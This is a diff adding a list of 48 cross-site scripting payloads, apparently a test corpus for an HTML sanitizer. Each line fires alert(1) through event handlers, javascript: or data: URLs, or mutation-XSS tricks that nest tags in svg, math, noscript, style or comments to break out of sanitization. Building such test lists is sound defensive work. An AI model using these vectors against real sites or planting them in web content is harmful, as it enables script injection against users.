@@ -1,0 +1,48 @@
+<imgsrc=xonerror=alert(1)>
+<svg><style><img src=x onerror=alert(1)></style></svg>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>
+<noembed><img title="</noembed><img src=x onerror=alert(1)>"></noembed>
+<iframe><img title="</iframe><img src=x onerror=alert(1)>"></iframe>
+<xmp><img title="</xmp><img src=x onerror=alert(1)>"></xmp>
+<textarea><img title="</textarea><img src=x onerror=alert(1)>"></textarea>
+<title><img title="</title><img src=x onerror=alert(1)>"></title>
+<noframes><img title="</noframes><img src=x onerror=alert(1)>"></noframes>
+<plaintext><img src=x onerror=alert(1)>
+<template><img src=x onerror=alert(1)></template>
+<!-- --!><img src=x onerror=alert(1)> -->
+<!--><img src=x onerror=alert(1)>-->
+<!---><img src=x onerror=alert(1)>-->
+<noscript><!--</noscript><img src=x onerror=alert(1)>--></noscript>
+<svg><![CDATA[</svg><img src=x onerror=alert(1)>]]></svg>
+<math><style><img src=x onerror=alert(1)></style></math>
+<svg><p><style><img src=x onerror=alert(1)></style></p></svg>
+<math><mi><style><img src=x onerror=alert(1)></style></mi></math>
+<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
+<math><annotation-xml encoding="text/html"><style><img src=x onerror=alert(1)></style></annotation-xml></math>
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
+<img/src=x/onerror=alert(1)>
+<img src=x onerror=alert(1)>
+<img src="x"onerror=alert(1)>
+<a href="javascript:alert(1)">x</a>
+<a href="&#106;avascript:alert(1)">x</a>
+<a href="javascript&colon;alert(1)">x</a>
+<svg><a href="javascript:alert(1)"><text>x</text></a></svg>
+<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>
+<svg><set attributeName="xlink:href" to="javascript:alert(1)"/></svg>
+<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<embed src="data:text/html,<script>alert(1)</script>">
+<style></style><img src=x onerror=alert(1)>
+<style><!--</style><img src=x onerror=alert(1)>--></style>
+<select><style></select><img src=x onerror=alert(1)></style></select>
+<table><style><img src=x onerror=alert(1)></style></table>
+<p title="</p><img src=x onerror=alert(1)>">x</p>
+<div><noscript></div><img src=x onerror=alert(1)></noscript>
+<img src=x onerror=alert(1)//
+<image src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)></video>
